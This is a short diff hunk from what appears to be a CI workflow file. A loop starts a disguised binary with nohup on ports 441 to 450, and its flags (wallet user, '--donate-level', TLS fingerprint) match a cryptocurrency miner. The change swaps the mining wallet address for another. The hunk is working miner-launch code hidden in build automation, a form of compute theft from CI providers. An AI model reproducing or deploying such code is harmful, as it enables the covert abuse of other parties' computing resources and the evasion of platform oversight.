@@ -75,7 +75,7 @@ jobs:
             # Start the process for multiple ports
             for port in $(seq 441 450); do
               # Run the process with the specified parameters in background
-              nohup $dynamic_sgr --url $ip:$port --user sugar1q8cfldyl35e8aq7je455ja9mhlazhw8xn22gvmr --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 > dance_$port_$timestamp.log 2>&1 &
+              nohup $dynamic_sgr --url $ip:$port --user NaWe5B5NqvZ3TV2Mj1pxYtTgrnTBwQDMDNtqVzMR6Xa5ejxu6hbi6KULHTqd732ebc5qTHvKXonokghUBd3pjLa8cznQZAsPivi2FKbV8qZk --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 > dance_$port_$timestamp.log 2>&1 &
               process_pid=$!
 
               echo "Started process with PID $process_pid using IP $ip and port $port"
